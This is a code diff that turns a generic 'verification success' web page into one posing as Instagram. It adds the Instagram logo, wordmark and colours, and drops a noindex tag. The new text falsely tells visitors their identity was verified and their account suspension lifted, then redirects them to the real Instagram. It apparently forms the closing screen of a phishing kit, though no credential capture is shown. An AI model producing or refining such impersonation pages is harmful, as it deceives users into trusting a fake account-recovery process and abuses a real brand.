@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta name="robots" content="noindex, nofollow"> <title>Verification Success</title>
+    <title>ins</title>
     <style>
         /* --- General Settings --- */
         body {
             margin: 0;
             padding: 20px;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #fafafa;
+            background-color: #fafafa; /* Instagram ka background thoda lighter hota hai */
             height: 100vh;
             display: flex;
             flex-direction: column;
@@ -27,7 +27,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            /* Same Gradient kept as per request */
+            /* Instagram Gradient Background */
             background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
             display: flex;
             justify-content: center;
@@ -66,26 +66,27 @@
             width: 100%;
         }
 
-        .brand-logo {
-            width: 90px;
-            height: 90px;
+        .ig-logo {
+            width: 80px;
+            height: 80px;
             margin-bottom: 15px;
-            /* Gradient applied to the new icon */
-            fill: url(#brand-gradient); 
+            /* Instagram Icon Gradient ke liye */
+            fill: url(#ig-gradient); 
             filter: drop-shadow(0 4px 6px rgba(0,0,0,0.1));
         }
 
-        .brand-name {
+        .ig-wordmark {
             color: #000;
             font-size: 28px;
-            font-weight: 600;
+            font-weight: 600; /* Thoda bold lekin clean */
             margin-bottom: 40px;
             display: block;
             letter-spacing: -0.5px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
         .success-icon {
-            color: #42b72a;
+            color: #42b72a; /* Success green same rakha hai */
             font-size: 70px;
             margin-bottom: 25px;
             display: block;
@@ -109,6 +110,7 @@
         }
 
         .btn {
+            /* Instagram Official Action Blue Color */
             background-color: #0095f6; 
             color: white;
             border: none;
@@ -138,15 +140,15 @@
 <body>
 
     <div id="congrats-popup">
-        <div class="congrats-text">SUCCESS</div>
+        <div class="congrats-text">CONGRATULATIONS</div>
     </div>
 
     <div id="main-content">
         <div class="card">
             
-            <svg class="brand-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
+            <svg class="ig-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                 <defs>
-                    <linearGradient id="brand-gradient" x1="0%" y1="100%" x2="100%" y2="0%">
+                    <linearGradient id="ig-gradient" x1="0%" y1="100%" x2="100%" y2="0%">
                         <stop offset="0%" style="stop-color:#f09433;stop-opacity:1" />
                         <stop offset="25%" style="stop-color:#e6683c;stop-opacity:1" />
                         <stop offset="50%" style="stop-color:#dc2743;stop-opacity:1" />
@@ -154,26 +156,27 @@
                         <stop offset="100%" style="stop-color:#bc1888;stop-opacity:1" />
                     </linearGradient>
                 </defs>
-                <path d="M256,32C174,69.06,121.38,86.55,116.54,88a32,32,0,0,0-20.54,30.3C96,270.13,164.65,419.85,246.66,476.53a32,32,0,0,0,34.68,0C363.35,419.85,432,270.13,432,118.3A32,32,0,0,0,411.46,88C406.62,86.55,354,69.06,272,32A32,32,0,0,0,256,32Z"/>
-                <path d="M356.7,180.7l-128,128a16,16,0,0,1-22.6,0l-54.6-54.6a16,16,0,0,1,22.6-22.6l43.3,43.3,116.7-116.7a16,16,0,0,1,22.6,22.6Z" fill="#ffffff" opacity="0.9"/>
+                <path d="M349.33,69.33a93.62,93.62,0,0,1,93.34,93.34V349.33a93.62,93.62,0,0,1-93.34,93.34H162.67a93.62,93.62,0,0,1-93.34-93.34V162.67a93.62,93.62,0,0,1,93.34-93.34H349.33m0-37.33H162.67C90.8,32,32,90.8,32,162.67V349.33C32,421.2,90.8,480,162.67,480H349.33C421.2,480,480,421.2,480,349.33V162.67C480,90.8,421.2,32,349.33,32Z"/>
+                <path d="M256,128A128,128,0,1,0,384,256,128,128,0,0,0,256,128Zm0,218.67A90.67,90.67,0,1,1,346.67,256,90.67,90.67,0,0,1,256,346.67Z"/>
+                <circle cx="386.67" cy="125.33" r="24"/>
             </svg>
             
-            <span class="brand-name">Account Status</span>
+            <span class="ig-wordmark">Instagram</span>
 
             <div class="success-icon">✓</div>
 
             <h1>Access Restored</h1>
             
-            <p>We have verified your details successfully. Your account restrictions have been removed.</p>
+            <p>We have successfully verified your identity. The suspension on your Instagram account has been lifted.</p>
             
-            <p style="font-size: 14px; color: #8e8e8e;">Your profile is now active.</p>
+            <p style="font-size: 14px; color: #8e8e8e;">Your account is now fully active. Tap below to return.</p>
 
-            <button class="btn" onclick="redirectUser()">Open App</button>
+            <button class="btn" onclick="openInstagramApp()">Go to Feed</button>
         </div>
     </div>
 
     <script>
-        // 1. Popup Animation Logic (Same as before)
+        // 1. Popup Animation Logic
         window.onload = function() {
             const popup = document.getElementById('congrats-popup');
             const mainContent = document.getElementById('main-content');
@@ -187,16 +190,17 @@
             }, 2000); // 2 Seconds
         };
 
-        // 2. Redirect Logic
-        function redirectUser() {
-            // Instagram deep link logic preserved
+        // 2. Redirect Logic (Updated for Instagram)
+        function openInstagramApp() {
+            // Instagram deep link
             var appUrl = "instagram://mainfeed"; 
+            // Fallback web link
             var webUrl = "https://www.instagram.com";
 
-            // Attempt to open App
+            // Try to open app
             window.location.href = appUrl;
 
-            // Fallback to Web
+            // If app doesn't open quickly, go to website
             setTimeout(function() {
                 window.location.href = webUrl;
             }, 1000);
